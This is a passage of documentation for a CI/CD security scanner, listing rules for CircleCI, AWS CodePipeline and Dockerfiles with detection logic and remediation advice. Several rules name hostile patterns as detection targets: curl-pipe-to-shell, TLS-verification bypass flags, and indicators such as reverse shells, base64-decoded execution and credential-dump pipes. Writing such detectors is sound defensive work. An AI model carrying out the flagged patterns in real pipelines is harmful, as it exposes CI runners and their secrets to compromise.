**Recommendation.** Remove AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the job `environment:` block. Use CircleCI's OIDC token with `aws-cli/setup` orb's role-based auth, or store credentials in a context with security group restrictions.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-005`](../providers/circleci.md#cc-005) in the [CircleCI provider](../providers/circleci.md).

#### `CC-006`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-006 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Unsigned artifacts cannot be verified downstream, so a tampered build is indistinguishable from a legitimate one. The check recognizes cosign, sigstore, slsa-framework, and notation-sign as signing tools.

**Recommendation.** Add a signing step to the pipeline, e.g. install cosign and run `cosign sign`, or use the `sigstore` CLI. Publish the signature alongside the artifact and verify it at consumption time.

**Source:** [`CC-006`](../providers/circleci.md#cc-006) in the [CircleCI provider](../providers/circleci.md).

#### `CC-007`: SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-007 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** Without an SBOM, downstream consumers cannot audit the exact set of dependencies shipped in the artifact, delaying vulnerability response when a transitive dep is disclosed. The check recognizes CycloneDX, syft, Anchore SBOM action, spdx-sbom-generator, Microsoft sbom-tool, and Trivy in SBOM mode.

**Recommendation.** Add an SBOM generation step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM to the build artifacts so consumers can ingest it into their vulnerability management pipeline.

**Source:** [`CC-007`](../providers/circleci.md#cc-007) in the [CircleCI provider](../providers/circleci.md).

#### `CC-008`: Credential-shaped literal in config body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-008 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Every string in the config is scanned against a set of credential patterns (AWS access keys, GitHub tokens, Slack tokens, JWTs, Stripe, Google, Anthropic, etc.). A match means a secret was pasted into YAML, the value is visible in every fork and every build log and must be treated as compromised.

**Recommendation.** Rotate the exposed credential immediately. Move the value to a CircleCI project environment variable or a context and reference it via the variable name. For cloud access, prefer OIDC federation over long-lived keys.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`CC-008`](../providers/circleci.md#cc-008) in the [CircleCI provider](../providers/circleci.md).

#### `CC-009`: Deploy job missing manual approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-009 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** In CircleCI, manual approval is implemented by adding a job with `type: approval` to the workflow and making the deploy job require it. Without this gate, any push to the triggering branch deploys immediately with no human review.

**Recommendation.** Add a `type: approval` job that precedes the deploy job in the workflow, and list it in the deploy job's `requires:`. This ensures a human must click Approve in the CircleCI UI before production changes roll out.

**Source:** [`CC-009`](../providers/circleci.md#cc-009) in the [CircleCI provider](../providers/circleci.md).

#### `CC-012`: Dynamic config via `setup: true` enables code injection <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-012 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** When `setup: true` is set at the top level, the config becomes a setup workflow. It generates the real pipeline config dynamically (typically via the `circleci/continuation` orb). An attacker who controls the setup job (e.g. via a malicious PR in a fork) can inject arbitrary config for all subsequent jobs, including deploy steps with production secrets.

**Recommendation.** If `setup: true` is required, restrict the setup job to a trusted branch filter and audit the generated config carefully. Ensure the continuation orb's `configuration_path` points to a checked-in file, not a dynamically generated one that could be influenced by PR content.

**Source:** [`CC-012`](../providers/circleci.md#cc-012) in the [CircleCI provider](../providers/circleci.md).

#### `CC-013`: Deploy job in workflow has no branch filter <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-013 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Without branch filters, a deploy job triggers on every branch push, including feature branches and forks. Restricting sensitive jobs to specific branches limits the blast radius of a compromised commit.

**Recommendation.** Add `filters.branches.only` to deploy-like workflow jobs so they only run on protected branches (e.g. main, release/*).

**Source:** [`CC-013`](../providers/circleci.md#cc-013) in the [CircleCI provider](../providers/circleci.md).

#### `CC-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-016 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a CircleCI config. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the CI runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`CC-016`](../providers/circleci.md#cc-016) in the [CircleCI provider](../providers/circleci.md).

#### `CC-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-018 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a CircleCI config. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-018`](../providers/circleci.md#cc-018) in the [CircleCI provider](../providers/circleci.md).

#### `CC-019`: `add_ssh_keys` without fingerprint restriction <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-019 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A bare `- add_ssh_keys` step (without `fingerprints:`) loads every SSH key configured on the project into the job. This violates least privilege, the job gains access to keys it does not need, increasing the blast radius if the job is compromised.

**Recommendation.** Always specify `fingerprints:` when using `add_ssh_keys` to restrict which SSH keys are loaded into the job. A bare `add_ssh_keys` step loads ALL project SSH keys.

**Source:** [`CC-019`](../providers/circleci.md#cc-019) in the [CircleCI provider](../providers/circleci.md).

#### `CC-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-020 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`CC-020`](../providers/circleci.md#cc-020) in the [CircleCI provider](../providers/circleci.md).

#### `CC-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-021 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-021`](../providers/circleci.md#cc-021) in the [CircleCI provider](../providers/circleci.md).

#### `CC-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-022 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`CC-022`](../providers/circleci.md#cc-022) in the [CircleCI provider](../providers/circleci.md).

#### `CC-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-cc-023 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`CC-023`](../providers/circleci.md#cc-023) in the [CircleCI provider](../providers/circleci.md).

#### `CC-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-024 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Signing (``cosign sign``) binds identity to bytes; attestation (``cosign attest``) binds a structured claim about *how* the artifact was built. SLSA verifiers check the latter so consumers can enforce builder/source/parameter policies.

**Recommendation.** Add a ``run: cosign attest`` command against a ``provenance.intoto.jsonl`` statement, or use the ``circleci/attestation`` orb. CC-006 covers signing; this rule covers the build-provenance step SLSA Build L3 requires.

**Source:** [`CC-024`](../providers/circleci.md#cc-024) in the [CircleCI provider](../providers/circleci.md).

#### `CC-025`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-025 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** CircleCI's ``restore_cache`` falls through each listed key until it finds a hit. When one of those keys is derived from ``CIRCLE_BRANCH``, ``CIRCLE_TAG``, or ``CIRCLE_PR_*``, values an attacker can set by opening a PR, the attacker can plant a cache entry that a protected job later uses. Uses checksum-of-lockfile or a static version label instead.

**Recommendation.** Derive ``save_cache`` and ``restore_cache`` keys from values the attacker can't control, the lockfile checksum (``{{ checksum "package-lock.json" }}``) and the build variant, not ``{{ .Branch }}`` or ``${CIRCLE_PR_NUMBER}``. A PR-scoped branch can seed a poisoned cache entry that a later main-branch run restores as trusted.

**Source:** [`CC-025`](../providers/circleci.md#cc-025) in the [CircleCI provider](../providers/circleci.md).

#### `CC-026`: Config contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cc-026 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Fires on concrete indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, credential-dump pipes, history-erasure).

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any contexts/env vars the pipeline can reach, and audit recent CircleCI runs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).

#### `CC-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-027 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Complements CC-002 (script injection from untrusted context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`CC-027`](../providers/circleci.md#cc-027) in the [CircleCI provider](../providers/circleci.md).

#### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Complements CC-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`CC-028`](../providers/circleci.md#cc-028) in the [CircleCI provider](../providers/circleci.md).

#### `CC-029`: Machine executor image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cc-029 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** CC-003 covers Docker images declared under ``docker:`` blocks. It does not reach the machine executor, where the image is on ``machine.image``. A rolling tag (``current``, ``edge``, ``default``) pulls a fresh image whenever CircleCI publishes one, reintroducing the same supply-chain risk Docker-image pinning is designed to eliminate.

**Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.

**Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).

#### `CC-030`: Workflow job uses context without branch filter or approval gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-030 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** CircleCI contexts are the recommended way to store shared secrets, but binding a context to a job is only half of least-privilege, the other half is controlling *when* the binding activates. Unrestricted workflow entries with ``context:`` turn every branch push into a secret-read event.

**Recommendation.** Either add ``filters.branches.only: [<protected branches>]`` to restrict when the context-bound job runs, or require a ``type: approval`` job in ``requires:`` so a human gates the secret-carrying execution. Without either gate, every push to the project loads the context's secrets into an ephemeral runner where any compromised step can exfiltrate them.

**Source:** [`CC-030`](../providers/circleci.md#cc-030) in the [CircleCI provider](../providers/circleci.md).

#### `CCM-001`: CodeCommit repository has no approval rule template attached <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ccm-001 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Approval-rule templates are CodeCommit's analog of GitHub's branch-protection require-review. Without one associated, the repository accepts merges from any push-permitted principal, including the PR author themselves, without any second-pair-of-eyes gate.

**Recommendation.** Create a CodeCommit approval-rule template requiring at least one approval from a designated pool of reviewers and associate it with every repository. Without one, any PR author with push rights can self-approve and merge.

**Source:** [`CCM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CCM-003`: CodeCommit trigger targets SNS/Lambda in a different account <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ccm-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** A repo trigger pointing at an SNS topic or Lambda in a different account fires under the receiving account's permissions on every push. Sometimes this is the intended shape (a centralized notifications account), but a cross-account fan-out from a compromised repo can drive actions in the receiving account that the source-account owner can't directly observe.

**Recommendation.** Move trigger targets into the same account as the repository or explicitly document the cross-account relationship. Cross-account triggers extend the blast radius of a repository compromise to whatever the target ARN can do.

**Source:** [`CCM-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CD-002`: AllAtOnce deployment config, no canary or rolling strategy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cd-002 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** AllAtOnce shifts 100% of traffic to the new revision in one step. There's no gradient to halt on if a CloudWatch alarm trips mid-rollout, the bad revision is already serving every request. Canary / linear configs introduce the shift-then-watch shape that lets monitors catch a regression before it's universal.

**Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.

**Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.

**Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.

**Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-002`: Artifact store not encrypted with customer-managed KMS key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-002 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** The pipeline's S3 artifact store holds intermediate build outputs handed between stages. Default SSE-S3 (AES256) encrypts at rest but uses an AWS-owned key whose policy you can't scope. A customer-managed CMK gives the same key-policy + CloudTrail Decrypt-event audit story you'd apply to Lambda code, Secrets Manager, or any other build output.

**Recommendation.** Configure a customer-managed AWS KMS key as the encryptionKey for each artifact store. This enables key rotation, fine-grained access policies, and CloudTrail auditing of decrypt operations.

**Source:** [`CP-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-003`: Source stage using polling instead of event-driven trigger <span class="pg-sev pg-sev--low">LOW</span> { #detail-cp-003 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** ``PollForSourceChanges=true`` polls the source repo every minute or two. Beyond the API-quota and latency cost, polling produces a less-useful CloudTrail story than event-driven triggers. You see the poll calls, not the specific commit that started the pipeline. EventBridge / CodeCommit triggers tie each pipeline start to the originating event.

**Recommendation.** Set PollForSourceChanges=false and configure an Amazon EventBridge rule or CodeCommit trigger to start the pipeline on change. This reduces latency, API usage, and improves auditability.

**Known false positives.**

- ``PollForSourceChanges=true`` is the CFN default for CodeCommit sources, so legacy templates can carry the flag without an active design decision behind it. The rule is advisory (consider EventBridge / CodeStarSourceConnection) rather than a real risk; defaults to LOW confidence so CI gates default-filter it.

**Source:** [`CP-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-004`: Legacy ThirdParty/GitHub source action (OAuth token) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-004 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** The legacy ThirdParty/GitHub source-action provider stores a long-lived OAuth token in the pipeline's action configuration. The token has whatever scope the granting GitHub user has, never rotates, and isn't directly revocable from the AWS side. CodeConnections (formerly CodeStar Connections) replaces this with an AWS-managed connection that the GitHub user can revoke.

**Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.

**Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-005`: Production Deploy stage has no preceding ManualApproval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-005 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** The complement to CP-001: this rule fires only on stages whose name contains ``prod`` / ``production`` / ``live``. Even teams that intentionally skip approvals for dev / staging deploys usually want a human in the loop for a production-tagged target.

**Recommendation.** Add a ``Manual`` approval action immediately before any stage whose name contains ``prod`` / ``production``. CP-001 covers the generic case; this rule specifically looks at production-tagged stages where the blast radius of an unreviewed deploy is largest.

**Source:** [`CP-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `CP-007`: CodePipeline v2 PR trigger accepts all branches <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-007 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** V2 pipelines added native PR triggers; without a ``branches.includes`` filter, any PR, including fork PRs from outside the org, fires the pipeline. The build stage runs with whatever IAM authority the pipeline's role carries, which is the full attack surface a fork-PR compromise can reach.

**Recommendation.** On V2 pipelines, add an ``includes`` filter under the trigger's ``branches`` block (and optionally ``pullRequest.events``) so only PRs targeting specific branches run. Without a filter, any fork-PR can execute the pipeline's build and deploy stages.

**Source:** [`CP-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-003`: ADD pulls remote URL without integrity verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-003 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** ``ADD`` with a URL is the historical Dockerfile footgun: it fetches at *build* time over HTTP(S) with no checksum and no signature, and the registry tag does not pin the source. A tampered server or DNS hijack silently swaps the content. ``COPY`` is for local files; ``RUN curl + verify`` is for remote ones.

**Recommendation.** Replace ``ADD https://...`` with a multi-step ``RUN``: download the file with ``curl -fsSLo``, verify a known-good checksum (``sha256sum -c``) or signature (``cosign verify-blob``), then extract / install. Better still: download the artifact in a builder stage and ``COPY`` it across. That way the verifier runs once at build time, not per-pull.

**Known false positives.**

- ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.

**Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection), [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Reuses ``_primitives/remote_script_exec.scan`` so the vocabulary matches the equivalent CI-side rules (GHA-016, GL-016, BB-012, ADO-016, CC-016, JF-016).

**Recommendation.** Download to a file, verify checksum or signature, then execute. ``curl -fsSL <url> -o /tmp/x.sh && sha256sum -c <(echo '<digest>  /tmp/x.sh') && bash /tmp/x.sh``. Vendor installers from well-known hosts (rustup.rs, get.docker.com, ...) are reported with vendor_trusted=true so reviewers can calibrate.

**Source:** [`DF-004`](../providers/dockerfile.md#df-004) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-005`: RUN uses shell-eval (eval / sh -c on a variable / backticks) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-005 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.

**Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.

**Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-006`: ENV or ARG carries a credential-shaped literal value <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-006 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS keys outright (the literal AWS access-key shape) and credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal.

**Recommendation.** Never hard-code credentials in a Dockerfile. ``ENV`` values are baked into the image layer history, even if the value is later overwritten, ``docker history --no-trunc`` reads the original. Use ``RUN --mount=type=secret`` for build-time secrets or runtime env injection (``docker run -e SECRET=…``) for runtime ones. Rotate any secret already exposed.

**Source:** [`DF-006`](../providers/dockerfile.md#df-006) in the [Dockerfile provider](../providers/dockerfile.md).

